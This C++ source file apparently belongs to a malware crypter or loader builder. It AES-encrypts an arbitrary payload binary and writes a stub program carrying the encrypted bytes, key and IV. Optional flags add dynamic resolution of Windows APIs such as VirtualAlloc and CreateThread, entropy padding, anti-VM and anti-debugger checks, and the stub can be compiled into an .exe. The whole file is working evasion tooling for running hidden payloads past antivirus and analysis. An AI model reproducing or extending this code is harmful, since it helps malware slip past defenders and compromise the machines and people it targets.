#include "utils.h"
#include "flags.h"
#include "constant.h"
#include <iostream>
#include <fstream>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <filesystem>
#include <random>
#include <regex>

using namespace std;

string generateRandomString(size_t length) {
    const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";
    const size_t max_index = (sizeof(charset) - 1);
    string randomString(length, 0);
    random_device rd;
    mt19937 generator(rd());
    uniform_int_distribution<> distribution(0, max_index);

    for (size_t i = 0; i < length; ++i) {
        randomString[i] = charset[distribution(generator)];
    }

    return randomString;
}

// Returns bytes of binary
vector<unsigned char> readBinary(string &path_to_payload) {
    ifstream file(path_to_payload, ios::binary | ios::ate);
    if (!file) {
        cerr << "\033[31mCould not open binary\n\033[0m";
        return {};
    }

    streamsize len = file.tellg();
    file.seekg(0, ios::beg);

    vector<char> buf(len);
    if (!file.read(buf.data(), len)) {
        std::cerr << "\033[31mError reading binary\n\033[0m";
        return {};
    }

    file.close();
    
    // Convert from char vector to unsigned char vector 
    vector<unsigned char> payloadBytes(buf.begin(), buf.end());

    return payloadBytes;
}

pair <vector<unsigned char>, vector<unsigned char>> generateKeyAndIV(size_t keySize, size_t ivSize) {
    vector<unsigned char> key(keySize);
    vector<unsigned char> iv(ivSize);
    
    if (!RAND_bytes(key.data(), keySize) || !RAND_bytes(iv.data(), ivSize)) {
        cerr << "\033[31merror generating key and IV\n\033[0m";
        exit(1);
    }

    return make_pair(key, iv);

}

vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    
    if (!ctx) {
        cerr << "\033[31mEncryption CTX error\n\033[0m";
        exit(1);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "\033[31mEncryption error\n\033[0m";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> ciphertext(buf.size());
    int len;

    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "\033[31mEncryption failed\n\033[0m";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}


vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        cerr << "\033[31mDecryption CTX error\n\033[0m";
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "\033[31mDecryption error\n\033[0m";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "\033[31mdecryption failed\n\033[0m";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}


void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    ifstream file(stubTemplatePath);
    if (!file) {
        cerr << "\033[31mCould not open stub template\n\033[0m";
        return;
    }
    
    string name = generateRandomString(8);
    filesystem::create_directories(outputDirPath);
    string outputPath = outputDirPath + "stub_" + name + ".cpp";

    ofstream outputFile(outputPath);
    if (!outputFile) {
        cerr << "\033[31mCould not create stub output\n\033[0m";
        return;
    }

    string line;
    while (getline(file, line)) {
        size_t pos;

        // Replace placeholders with actual values
        if ((pos = line.find("/*ENCRYPTED_BYTES*/")) != string::npos) {
            line.replace(pos, strlen("/*ENCRYPTED_BYTES*/"), bytesToHexString(payloadBytes));
        }
        if ((pos = line.find("/*KEY*/")) != string::npos) {
            line.replace(pos, strlen("/*KEY*/"), bytesToHexString(key));
        }
        if ((pos = line.find("/*IV*/")) != string::npos) {
            line.replace(pos, strlen("/*IV*/"), bytesToHexString(iv));
        }

        // Check dynamic API resolution flag first so that anti vm api calls dont get updated in the case that both flags are set 
        if(flags[DYN] == true){
            // Replacing the calls in execute() first before the resolution logic is added, so the LoadLibraryA() call used when loading kernel32.dll is not replaced
            line = regex_replace(line, regex("\\bVirtualAlloc\\b"), "pVirtualAlloc");
            line = regex_replace(line, regex("\\bVirtualFree\\b"), "pVirtualFree");
            line = regex_replace(line, regex("\\bLoadLibraryA\\b"), "pLoadLibraryA");
            line = regex_replace(line, regex("\\bGetProcAddress\\b"), "pGetProcAddress");
            line = regex_replace(line, regex("\\bCreateThread\\b"), "pCreateThread");
            line = regex_replace(line, regex("\\bWaitForSingleObject\\b"), "pWaitForSingleObject");
            line = regex_replace(line, regex("\\bCloseHandle\\b"), "pCloseHandle");
            
            if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
                line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
            }
            if ((pos = line.find("/*DYN_RESOLUTION*/")) != string::npos) {
                line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
            }

            cout << "\n\033[32mset dynamic api resolution successfully\n\033[0m";
            flags[DYN] = false;
        }

        if (flags[RAND] == true){
            if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
            }
            // dictionary in resource
            // choose random selection of words and populate large vector to replace /*ENTROPY*/
            if ((pos = line.find("/*ENTROPY*/")) != string::npos) {
                line.replace(pos, strlen("/*ENTROPY*/"), "/*ENTROPY*/");
            }
            if ((pos = line.find("execute(payload);")) != string::npos) {
                line.replace(pos, strlen("execute(payload);"), RAND_CALL);
            }
            
            cout << "\n\033[32mset randomizaton successfully\n\033[0m";
            flags[RAND] = false;
        }
        
        if (flags[VM] == true){
            if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
            }
            if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
                line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
            }

            cout << "\n\033[32mset antiVM successfully\n\033[0m";
            flags[VM] = false;
        }

        if (flags[DB] == true){
            if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
                line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
            }
            if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
                line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
            }

            cout << "\n\033[32mset antiDB successfully\n\033[0m";
            flags[DB] = false;
        }

        outputFile << line << endl;
    }

    file.close();
    outputFile.close();

    cout << "\n\033[32mSuccessfully wrote stub to: " << outputPath << "\n\033[0m";

    if(flags[COMPILE] == true){
        cout << "\n\033[33mcompiling stub...\n\033[0m";
        string tmp = "make out/stub_" + name + ".exe";
        const char *command = tmp.c_str();

        int out = system(command);
        if(out == 0){
            cout << "\n\033[32mcompilation successful\n";
            cout << "->\t/out/stub_" << name << ".exe\n\033[0m";
        } else {
            cerr << "\n\033[31mcompilation failed\n\033[0m";
        }

    }
}